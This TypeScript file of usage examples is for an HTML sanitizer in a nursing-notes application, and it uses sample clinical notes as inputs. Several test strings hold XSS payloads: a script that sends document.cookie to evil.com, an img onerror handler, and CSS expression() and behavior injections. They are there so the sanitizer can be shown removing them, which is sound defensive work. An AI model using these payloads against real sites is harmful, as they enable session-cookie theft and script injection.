// =============================================================================
// HTML Sanitization Utility - Usage Examples
// =============================================================================
// Example code demonstrating how to use the sanitization utility
// =============================================================================

import {
  sanitizeHtml,
  validateSafeHtml,
  sanitizeNursingNoteFields,
  getWordCount,
  getCharacterCount,
  getEstimatedReadingTime,
  type SanitizeOptions,
} from './sanitize';

// =============================================================================
// Example 1: Basic XSS Prevention
// =============================================================================

export function example1_BasicXSSPrevention() {
  // User input from rich text editor that contains malicious code
  const maliciousInput = `
    <p>Patient presents with symptoms of flu.</p>
    <script>
      // Malicious code attempting to steal session data
      fetch('https://evil.com/steal?data=' + document.cookie);
    </script>
    <p>Recommended rest and fluids.</p>
  `;

  // Sanitize the input - removes script tags and malicious code
  const safe = sanitizeHtml(maliciousInput);

  console.log('Safe output:', safe);
  // Output: <p>Patient presents with symptoms of flu.</p><p>Recommended rest and fluids.</p>

  return safe;
}

// =============================================================================
// Example 2: Preserving Clinical Formatting
// =============================================================================

export function example2_PreserveClinicalFormatting() {
  // SOAP note with proper clinical formatting
  const soapNote = `
    <h3>Subjective</h3>
    <p>Patient reports <strong>persistent cough</strong> for <em>3 days</em>.</p>
    <p>Denies fever, chills, or shortness of breath.</p>

    <h3>Objective</h3>
    <ul>
      <li>Temperature: 98.6°F</li>
      <li>Blood Pressure: 120/80 mmHg</li>
      <li>Heart Rate: 72 bpm</li>
      <li>Respiratory Rate: 16 breaths/min</li>
      <li>Oxygen Saturation: 98% on room air</li>
    </ul>

    <h3>Assessment</h3>
    <p>Upper respiratory infection, likely viral etiology.</p>

    <h3>Plan</h3>
    <ol>
      <li>Supportive care with rest and fluids</li>
      <li>Over-the-counter cough suppressant as needed</li>
      <li>Return if symptoms worsen or fever develops</li>
      <li>Follow-up in <u>1 week</u> if not improved</li>
    </ol>
  `;

  // Sanitize while preserving safe formatting
  const sanitized = sanitizeHtml(soapNote);

  console.log('Sanitized SOAP note:', sanitized);
  // All safe HTML tags are preserved

  return sanitized;
}

// =============================================================================
// Example 3: Sanitize Complete Nursing Note Object
// =============================================================================

export function example3_SanitizeNursingNoteObject() {
  // Complete nursing note with multiple HTML fields
  const nursingNote = {
    id: 123,
    patientId: 456,
    noteDate: '2024-01-15',
    noteStatus: 'COMPLETED' as const,

    // HTML content fields that need sanitization
    content: '<p>Routine wound care performed <script>alert("xss")</script></p>',
    subjective: '<p>Patient reports <strong>pain level 3/10</strong></p>',
    objective: `
      <p>Wound assessment:</p>
      <ul>
        <li>Size: 2cm x 3cm</li>
        <li>Drainage: Minimal serous</li>
        <li>Color: Pink granulation tissue</li>
      </ul>
    `,
    assessment: '<p>Wound healing appropriately</p>',
    plan: '<p>Continue current treatment regimen</p>',
    interventions: `
      <ol>
        <li>Cleansed wound with <strong>normal saline</strong></li>
        <li>Applied <em>hydrocolloid dressing</em></li>
      </ol>
    `,
    patientResponse: '<p>Patient tolerated procedure well</p>',
    patientEducation: '<p>Educated on signs of infection to monitor</p>',
    communication: '<p>Contacted physician regarding wound progress</p>',

    // Non-HTML fields (preserved as-is)
    nurseId: 'usr_123',
    nurseName: 'Jane Smith, RN',
    createdAt: new Date(),
    updatedAt: new Date(),
  };

  // Sanitize all HTML fields at once
  const sanitizedNote = sanitizeNursingNoteFields(nursingNote);

  console.log('Sanitized note:', sanitizedNote);
  // All HTML fields are sanitized, non-HTML fields unchanged

  return sanitizedNote;
}

// =============================================================================
// Example 4: Advanced Sanitization Options
// =============================================================================

export function example4_AdvancedOptions() {
  const htmlContent = '<p>This is a very long clinical note with lots of detail...</p>';

  // Option 1: Strip all HTML for plain text search/indexing
  const plainText = sanitizeHtml(htmlContent, {
    stripAll: true,
    preserveLineBreaks: true,
  });
  console.log('Plain text:', plainText);

  // Option 2: Create preview with length limit
  const preview = sanitizeHtml(htmlContent, {
    maxLength: 100,
    stripAll: true,
  });
  console.log('Preview:', preview);

  // Option 3: Disable data-* attributes for stricter security
  const strict = sanitizeHtml(htmlContent, {
    allowDataAttributes: false,
  });
  console.log('Strict mode:', strict);

  // Option 4: Allow custom tags for special use cases
  const customTags = sanitizeHtml('<article><p>Content</p></article>', {
    additionalAllowedTags: ['article', 'section'],
  });
  console.log('With custom tags:', customTags);

  return {
    plainText,
    preview,
    strict,
    customTags,
  };
}

// =============================================================================
// Example 5: Validation Before Sanitization
// =============================================================================

export function example5_ValidationWorkflow() {
  const userInput = '<p>Clinical note <script>alert("xss")</script></p>';

  // Step 1: Validate the HTML
  const validation = validateSafeHtml(userInput);

  // Step 2: Log security issues if found
  if (!validation.isValid) {
    console.error('Security violations detected:', validation.errors);
    // In production, log this for security review
    // logSecurityEvent('XSS_ATTEMPT', { input: userInput, errors: validation.errors });
  }

  // Step 3: Log warnings
  if (validation.warnings.length > 0) {
    console.warn('Validation warnings:', validation.warnings);
  }

  // Step 4: Sanitize regardless (defense in depth)
  const safe = sanitizeHtml(userInput);

  return {
    isValid: validation.isValid,
    errors: validation.errors,
    warnings: validation.warnings,
    sanitized: safe,
  };
}

// =============================================================================
// Example 6: Text Analysis for Documentation Metrics
// =============================================================================

export function example6_TextAnalysis() {
  const clinicalNote = `
    <h3>Patient Assessment</h3>
    <p>
      Patient is a 65-year-old male with a history of hypertension and
      diabetes mellitus type 2. He presents today for routine follow-up.
      Blood pressure is well-controlled on current medication regimen.
      Blood glucose levels have been stable with HbA1c of 6.5%.
    </p>
    <p>
      Physical examination reveals no acute distress. Heart rate regular,
      lungs clear to auscultation bilaterally. No peripheral edema noted.
    </p>
    <h3>Plan</h3>
    <ol>
      <li>Continue current medications</li>
      <li>Recheck labs in 3 months</li>
      <li>Discussed lifestyle modifications including diet and exercise</li>
    </ol>
  `;

  // Calculate metrics
  const wordCount = getWordCount(clinicalNote);
  const charCount = getCharacterCount(clinicalNote);
  const readingTime = getEstimatedReadingTime(clinicalNote);

  console.log('Documentation Metrics:');
  console.log(`- Word count: ${wordCount}`);
  console.log(`- Character count: ${charCount}`);
  console.log(`- Estimated reading time: ${readingTime} minutes`);

  return {
    wordCount,
    charCount,
    readingTime,
  };
}

// =============================================================================
// Example 7: Integration with Form Submission
// =============================================================================

export function example7_FormSubmissionWorkflow() {
  // Simulated form data from rich text editor
  const formData = {
    patientId: 123,
    noteDate: '2024-01-15',
    content: '<p>Clinical assessment <script>alert(1)</script></p>',
    subjective: '<p>Patient reports symptoms</p>',
    objective: '<p>Vital signs within normal limits</p>',
  };

  // Create sanitization workflow
  const submitNursingNote = (data: typeof formData) => {
    // Step 1: Validate all HTML fields
    const fieldsToValidate = ['content', 'subjective', 'objective'];
    const validationResults = fieldsToValidate.map(field => ({
      field,
      validation: validateSafeHtml(data[field as keyof typeof data] as string),
    }));

    // Step 2: Check for any validation errors
    const hasErrors = validationResults.some(r => !r.validation.isValid);
    if (hasErrors) {
      console.error('Validation errors found:', validationResults);
    }

    // Step 3: Sanitize all HTML fields
    const sanitized = sanitizeNursingNoteFields(data);

    // Step 4: Submit to API
    console.log('Submitting sanitized data:', sanitized);
    // return api.createNursingNote(sanitized);

    return sanitized;
  };

  return submitNursingNote(formData);
}

// =============================================================================
// Example 8: Auto-save with Sanitization
// =============================================================================

export function example8_AutoSaveWorkflow() {
  let draftContent = '';

  // Simulated auto-save function
  const autoSave = (html: string) => {
    // Sanitize before saving draft
    const safe = sanitizeHtml(html);

    // Save to local storage or API
    localStorage.setItem('nursing_note_draft', safe);
    console.log('Auto-saved sanitized content');

    draftContent = safe;
    return safe;
  };

  // Simulated user typing
  const userInput = '<p>Patient assessment in progress <img onerror="alert(1)" src=x></p>';
  autoSave(userInput);

  // Load draft
  const loadDraft = () => {
    const draft = localStorage.getItem('nursing_note_draft') || '';
    // Content is already sanitized from auto-save
    return draft;
  };

  return {
    saved: draftContent,
    loaded: loadDraft(),
  };
}

// =============================================================================
// Example 9: CSS Sanitization
// =============================================================================

export function example9_CSSSanitization() {
  // HTML with inline styles (some safe, some dangerous)
  const styledContent = `
    <p style="color: red; text-align: center;">Important finding</p>
    <div style="background-color: yellow; expression(alert('xss'))">Highlighted</div>
    <span style="font-weight: bold; behavior: url(evil.htc)">Bold text</span>
  `;

  const sanitized = sanitizeHtml(styledContent);

  console.log('CSS sanitized:', sanitized);
  // Safe styles preserved, dangerous ones removed

  return sanitized;
}

// =============================================================================
// Example 10: Medication List Formatting
// =============================================================================

export function example10_MedicationList() {
  const medicationList = `
    <h4>Current Medications</h4>
    <table>
      <thead>
        <tr>
          <th>Medication</th>
          <th>Dose</th>
          <th>Frequency</th>
          <th>Route</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><strong>Lisinopril</strong></td>
          <td>10 mg</td>
          <td>Once daily</td>
          <td>PO</td>
        </tr>
        <tr>
          <td><strong>Metformin</strong></td>
          <td>500 mg</td>
          <td>Twice daily</td>
          <td>PO</td>
        </tr>
        <tr>
          <td><strong>Aspirin</strong></td>
          <td>81 mg</td>
          <td>Once daily</td>
          <td>PO</td>
        </tr>
      </tbody>
    </table>
    <p><em>Last updated: 2024-01-15</em></p>
  `;

  // Sanitize medication list (preserves table structure)
  const sanitized = sanitizeHtml(medicationList);

  console.log('Sanitized medication list:', sanitized);

  return sanitized;
}

// =============================================================================
// Export all examples for testing
// =============================================================================

export const examples = {
  basicXSSPrevention: example1_BasicXSSPrevention,
  preserveClinicalFormatting: example2_PreserveClinicalFormatting,
  sanitizeNursingNoteObject: example3_SanitizeNursingNoteObject,
  advancedOptions: example4_AdvancedOptions,
  validationWorkflow: example5_ValidationWorkflow,
  textAnalysis: example6_TextAnalysis,
  formSubmissionWorkflow: example7_FormSubmissionWorkflow,
  autoSaveWorkflow: example8_AutoSaveWorkflow,
  cssSanitization: example9_CSSSanitization,
  medicationList: example10_MedicationList,
};

// Run all examples (for testing purposes)
if (require.main === module) {
  console.log('\n=== Running All Examples ===\n');

  Object.entries(examples).forEach(([name, fn]) => {
    console.log(`\n--- ${name} ---`);
    try {
      fn();
      console.log('✓ Success');
    } catch (error) {
      console.error('✗ Error:', error);
    }
  });
}
